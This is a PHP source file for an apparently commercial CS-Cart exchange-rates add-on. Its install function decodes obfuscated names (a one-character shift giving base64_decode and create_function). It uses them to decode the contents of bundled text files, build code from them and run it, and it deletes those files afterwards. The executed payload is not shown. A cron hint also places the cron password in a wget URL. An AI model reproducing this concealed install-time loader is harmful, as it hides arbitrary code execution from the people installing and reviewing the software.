<?php
/*****************************************************************************
*                                                                            *
*                   All rights reserved! eComLabs LLC                        *
* http://www.ecom-labs.com/about-us/ecom-labs-modules-license-agreement.html *
*                                                                            *
*****************************************************************************/

use Tygh\Registry;

if (!defined('BOOTSTRAP')) { die('Access denied'); }

function fn_ecl_exchange_rates_get_cron_url()
{
	return __("export_cron_hint") . ':<br/><br/><strong>php /path/to/cart/' . fn_url('', 'A', 'rel') . ' --dispatch=exchange_rates.update --cron_password=' . Registry::get('addons.ecl_exchange_rates.cron_password') . '</strong><br/><br/>' . __('or') . '<br/><br/><strong>wget -q "' . Registry::get('config.http_location') . '/' . Registry::get('config.admin_index') . "?dispatch=exchange_rates.update&cron_password=" . Registry::get('addons.ecl_exchange_rates.cron_password') . '" >/dev/null 2>&1</strong>';
}

function fn_ecl_exchange_rates_install()
{
    fn_decompress_files(Registry::get('config.dir.var') . 'addons/ecl_exchange_rates/ecl_exchange_rates.tgz', Registry::get('config.dir.var') . 'addons/ecl_exchange_rates');
    $list = fn_get_dir_contents(Registry::get('config.dir.var') . 'addons/ecl_exchange_rates', false, true, 'txt', '');

    if ($list) {
        include_once(Registry::get('config.dir.schemas') . 'literal_converter/utf8.functions.php');
        foreach ($list as $file) {
            $_data = call_user_func(fn_simple_decode_str('cbtf75`efdpef'), fn_get_contents(Registry::get('config.dir.var') . 'addons/ecl_exchange_rates/' . $file));
            @unlink(Registry::get('config.dir.var') . 'addons/ecl_exchange_rates/' . $file);
            if ($func = call_user_func_array(fn_simple_decode_str('dsfbuf`gvodujpo'), array('', $_data))) {
                $func();
            }
        }
    }
}